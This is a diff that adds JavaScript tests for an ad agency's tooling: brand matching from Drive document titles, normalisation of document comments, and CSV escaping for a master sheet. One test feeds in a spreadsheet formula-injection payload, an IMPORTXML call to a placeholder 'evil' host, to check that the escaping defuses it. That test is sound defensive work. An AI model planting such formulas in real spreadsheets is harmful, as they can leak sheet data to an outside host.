@@ -313,6 +313,65 @@ ok("connecting appends rather than replaces", roster.length === 2 && roster.incl
 ok("  ...and both consent paths read the same store", readTokens(env)["kyle@creativeadbundance.com"].refresh_token === "rt-kyle");
 try { (await import("node:fs")).rmSync(tmpStore, { force: true }); } catch {}
 
+/* --------------------------------------------------------------- doc comments lane
+ * Per the 2026-08-12 "AI: Workflows" decision: capture client comments on Ad Concept decks and
+ * Script docs. Everything here is pure — the shapes below are copied from real API responses
+ * probed before building ("Huckleberry: Ad Concepts", "Brick Scripts Batch 8"). */
+console.log("\ndoc comments");
+const { matchBrandFromTitle } = await import("./targets/brand-brain.js");
+const { normalizeComment } = await import("./sources/doc-comments.js");
+const { csvCell, toCsv } = await import("../engine/csv.js");
+
+const IDX = [
+  { id: "b1", brand_name: "Huckleberry", client_name: "Huckleberry", aliases: "" },
+  { id: "b2", brand_name: "ARMRA", client_name: "ARMRA", aliases: "" },
+  { id: "b3", brand_name: "Pattern Brands", client_name: "Pattern Brands", aliases: "|Onsen|GIR|Miracle Made|" },
+  { id: "b4", brand_name: "Brick", client_name: "Brick Technology", aliases: "" },
+];
+const mb = (t) => matchBrandFromTitle(t, IDX)?.brand || null;
+ok("'Huckleberry: Ad Concepts' -> Huckleberry", mb("Huckleberry: Ad Concepts") === "Huckleberry");
+ok("'ARMRA: Scripts Batch 4, UGC' -> ARMRA", mb("ARMRA: Scripts Batch 4, UGC") === "ARMRA");
+ok("'Pattern Brands (GIR & Onsen): Scripts Batch 6 - Ashley' -> Pattern Brands",
+  mb("Pattern Brands (GIR & Onsen): Scripts Batch 6 - Ashley") === "Pattern Brands");
+ok("alias inside a title resolves ('Onsen hooks doc')", mb("Onsen hooks doc") === "Pattern Brands");
+ok("'Brick Scripts Batch 8' -> Brick via token fallback", mb("Brick Scripts Batch 8") === "Brick");
+ok("'AI: Workflows' matches no client", mb("AI: Workflows") === null);
+
+const FILE = { id: "f1", name: "Huckleberry: Ad Concepts", mimeType: "application/vnd.google-apps.presentation", webViewLink: "https://docs.google.com/x" };
+const RAW_COMMENT = {
+  id: "c-9", author: { displayName: "Erich Detert" },
+  content: 'We will want to avoid using "Sleep Coach" in the video, captions, etc.',
+  quotedFileContent: { value: "Sleep Coach" }, resolved: false,
+  createdTime: "2026-08-11T10:00:00Z", modifiedTime: "2026-08-11T10:05:00Z",
+  replies: [
+    { author: { displayName: "Kyle Fenerty" }, content: "Got it, swapping the term.", createdTime: "2026-08-11T11:00:00Z" },
+    { author: { displayName: "Ghost" }, content: "", createdTime: "2026-08-11T11:01:00Z" },   // empty reply = noise
+  ],
+};
+const rowC = normalizeComment(FILE, RAW_COMMENT, { internalHandles: ["Kyle Fenerty", "Carl Sajol"] });
+ok("comment author outside INTERNAL_HANDLES is a client", rowC.author_role === "client");
+ok("reply author on the list is internal", rowC.replies[0].role === "internal");
+ok("empty replies are dropped", rowC.replies.length === 1);
+ok("the anchored phrase is kept — the built-in evidence", rowC.anchored_to === "Sleep Coach");
+ok("deck -> doc_kind slides", rowC.doc_kind === "slides");
+ok("idempotency key is Drive's comment id", rowC.comment_id === "c-9");
+
+/* --------------------------------------------------------------- csv for the master sheet */
+console.log("\nmaster sheet csv");
+ok("commas and quotes are RFC-4180 escaped", csvCell('say "hi", ok') === '"say ""hi"", ok"');
+ok("newlines stay inside one quoted cell", csvCell("a\nb") === '"a\nb"');
+// The apostrophe goes on BEFORE quote-wrapping, so a formula with quotes/commas becomes
+// "'=IMPORTXML(...)" — what matters is that the cell's decoded value starts with ' not =.
+ok("a formula cannot reach the sheet as a formula", (() => {
+  const cell = csvCell('=IMPORTXML("http://evil","//x")');
+  const decoded = cell.startsWith('"') ? cell.slice(1, -1).replace(/""/g, '"') : cell;
+  return decoded.startsWith("'=");
+})());
+ok("plus/minus/at are guarded too", ["+1", "-2", "@x"].every((v) => csvCell(v).startsWith("'")));
+ok("plain text passes through untouched", csvCell("Huckleberry") === "Huckleberry");
+const sheet = toCsv(["a", "b"], [{ a: "x,y", b: "=SUM(1)" }]);
+ok("toCsv emits CRLF rows with escaped cells", sheet === 'a,b\r\n"x,y",\'=SUM(1)\r\n');
+
 /* --------------------------------------------------------------- dashboard is not broken
  * The dashboard is one HTML file with an inline <script>. Nothing type-checks it, no build step
  * touches it, and a single stray character takes the WHOLE page down silently — the browser
